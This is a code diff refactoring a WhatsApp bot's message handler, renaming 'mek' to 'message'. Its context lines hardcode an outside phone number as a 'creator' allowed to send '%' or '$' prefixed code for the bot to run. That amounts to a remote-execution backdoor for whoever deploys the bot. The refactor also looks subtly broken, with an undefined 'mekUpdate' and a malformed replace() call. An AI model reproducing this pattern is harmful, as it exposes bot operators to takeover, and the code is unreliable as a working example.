@@ -246,41 +246,41 @@ async function connectToWA() {
         }
 
         //============= Main messages handler ===============
-        mek = mek.messages[0]
-        if (!mek.message) return
-        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-        ? mek.message.ephemeralMessage.message 
-        : mek.message;
+        const message = mekUpdate.messages[0];
+        if (!message.message) return;
+        message.message = (getContentType(message.message) === 'ephemeralMessage') 
+        ? message.message.ephemeralMessage.message 
+        : message.message;
 
         if (config.READ_MESSAGE === 'true') {
-            await conn.readMessages([mek.key]);
-            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+            await conn.readMessages([message.key]);
+            console.log(`Marked message from ${message.key.remoteJid} as read.`);
         }
 
-        if(mek.message.viewOnceMessageV2)
-            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+        if(message.message.viewOnceMessageV2)
+            message.message = (getContentType(message.message) === 'ephemeralMessage') ? message.message.ephemeralMessage.message : message.message
 
         await Promise.all([
-            saveMessage(mek),
+            saveMessage(message),
         ]);
 
-        const m = sms(conn, mek)
-        const type = getContentType(mek.message)
-        const content = JSON.stringify(mek.message)
-        const from = mek.key.remoteJid
-        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
-        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+        const m = sms(conn, message)
+        const type = getContentType(message.message)
+        const content = JSON.stringify(message.message)
+        const from = message.key.remoteJid
+        const quoted = type == 'extendedTextMessage' && message.message.extendedTextMessage.contextInfo != null ? message.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+        const body = (type === 'conversation') ? message.message.conversation : (type === 'extendedTextMessage') ? message.message.extendedTextMessage.text : (type == 'imageMessage') && message.message.imageMessage.caption ? message.message.imageMessage.caption : (type == 'videoMessage') && message.message.videoMessage.caption ? message.message.videoMessage.caption : ''
         const isCmd = body.startsWith(prefix)
-        var budy = typeof mek.text == 'string' ? mek.text : false;
+        var budy = typeof message.text == 'string' ? message.text : false;
         const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
         const args = body.trim().split(/ +/).slice(1)
         const q = args.join(' ')
         const text = args.join(' ')
         const isGroup = from.endsWith('@g.us')
-        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+        const sender = message.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (message.key.participant || message.key.remoteJid)
         const senderNumber = sender.split('@')[0]
         const botNumber = conn.user.id.split(':')[0]
-        const pushname = mek.pushName || 'Sin Nombre'
+        const pushname = message.pushName || 'Sin Nombre'
         const isMe = botNumber.includes(senderNumber)
         const isOwner = ownerNumber.includes(senderNumber) || isMe
         const botNumber2 = await jidNormalizedUser(conn.user.id);
@@ -292,15 +292,15 @@ async function connectToWA() {
         const isAdmins = isGroup ? groupAdmins.includes(sender) : false
         const isReact = m.message.reactionMessage ? true : false
         const reply = (teks) => {
-            conn.sendMessage(from, { text: teks }, { quoted: mek })
+            conn.sendMessage(from, { text: teks }, { quoted: message })
         }
         const udp = botNumber.split('@')[0];
         const jawad = ('254778074353');
         let isCreator = [udp, jawad, config.DEV]
             .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-            .includes(mek.sender);
+            .includes(message.sender);
 
-        if (isCreator && mek.text?.startsWith('%')) {
+        if (isCreator && message.text?.startsWith('%')) {
             let code = budy.slice(2);
             if (!code) {
                 reply(`Provide me with a query to run Master!`);
@@ -317,7 +317,7 @@ async function connectToWA() {
             return;
         }
 
-        if (isCreator && mek.text?.startsWith('$')) {
+        if (isCreator && message.text?.startsWith('$')) {
             let code = budy.slice(2);
             if (!code) {
                 reply(`Provide me with a query to run Master!`);
@@ -401,10 +401,10 @@ async function connectToWA() {
         if (isCmd) {
             const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
             if (cmd) {
-                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: message.key }})
 
                 try {
-                    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+                    cmd.function(conn, message, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                 } catch (e) {
                     console.error("[PLUGIN ERROR] " + e);
                 }
@@ -412,19 +412,19 @@ async function connectToWA() {
         }
         events.commands.map(async(command) => {
             if (body && command.on === "body") {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
-            } else if (mek.q && command.on === "text") {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+            } else if (m.q && command.on === "text") {
+                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
             } else if (
                 (command.on === "image" || command.on === "photo") &&
-                mek.type === "imageMessage"
+                message.type === "imageMessage"
             ) {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
             } else if (
                 command.on === "sticker" &&
-                mek.type === "stickerMessage"
+                message.type === "stickerMessage"
             ) {
-                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
             }});
     });
 
